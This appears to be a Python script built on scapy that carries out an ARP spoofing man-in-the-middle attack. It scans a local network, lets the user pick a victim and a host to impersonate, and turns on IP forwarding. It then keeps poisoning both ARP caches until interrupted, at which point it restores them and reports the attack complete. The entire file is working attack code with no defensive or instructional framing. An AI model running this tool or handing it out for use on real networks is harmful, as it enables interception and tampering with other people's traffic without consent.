import scapy.all as scapy
import subprocess
import time
# scapy.ls(scapy.ARP) here we have seen op = 1 by default
#print(packet.show())
#print(packet.summary())
choice = input("Want to Enable IP Forwarding (y/n): ")
if choice == 'y':
    subprocess.call(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
else:
    subprocess.call(["echo", "0", ">", "/proc/sys/net/ipv4/ip_forward"])

def scan(ip):
    #scapy.arping(ip)
    #scapy.ls(scapy.ARP())
    #scapy.ls(scapy.Ether())

    arpReq = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arpBroadReq = broadcast/arpReq
    ans = scapy.srp(arpBroadReq, timeout=10, verbose=False)[0]
    clientLst = []
    for i in ans:
        clientDict = {'ip': i[1].psrc, 'mac': i[1].hwsrc}
        clientLst.append(clientDict)
    return clientLst

def printRes(clientLst):
    print('S.No.\t\tIP\t\t\tMAC Address')
    print('--------------------------------------------------------------')
    count = 1
    for n in clientLst:
        print(str(count) + '\t\t' + n['ip'] + '\t\t' + n['mac'])
        count += 1

def spoof(targetIP,spoofIP,targetMac):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
    scapy.send(packet, verbose=False)

def restore(destIP, srcIP, destMac, srcMac):
    packet = scapy.ARP(op=2, pdst=destIP, hwdst=destMac, psrc=srcIP, hwsrc=srcMac)
    scapy.send(packet, count=4, verbose=False)


def getMac(opt1, opt2, clientLst):
    tIP = clientLst[opt1-1]['ip']
    tMac = clientLst[opt1-1]['mac']
    sIP = clientLst[opt2-1]['ip']
    sMac = clientLst[opt2-1]['mac']
    return (tIP, tMac,sIP,sMac)


subprocess.call("ifconfig", shell=True)
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
st = input("Enter scanning range Ip Address:")
res = scan(st)
printRes(res)
opt1 = int(input("Enter serial of Target Machine:"))
opt2 = int(input("Enter serial of Spoofing IP:"))


count = 0
try:
    while True:
        tIP, tMac, sIP, sMac = getMac(opt1, opt2, res)
        spoof(tIP, sIP, tMac)
        tIP, tMac, sIP, sMac = getMac(opt2, opt1, res)
        spoof(tIP, sIP, tMac)
        count += 2
        print('\r[+] ' + str(count) + " packets has been sent", end="")
        time.sleep(1)

except KeyboardInterrupt:
    tIP, tMac, sIP, sMac = getMac(opt1, opt2, res)
    print('\n[+] Keyboard Interrupt Found!\nResetting ARP tables............Please Wait!')
    restore(tIP, sIP, tMac, sMac)
    time.sleep(2)
    print('Attack Completed Successfully')
    exit()
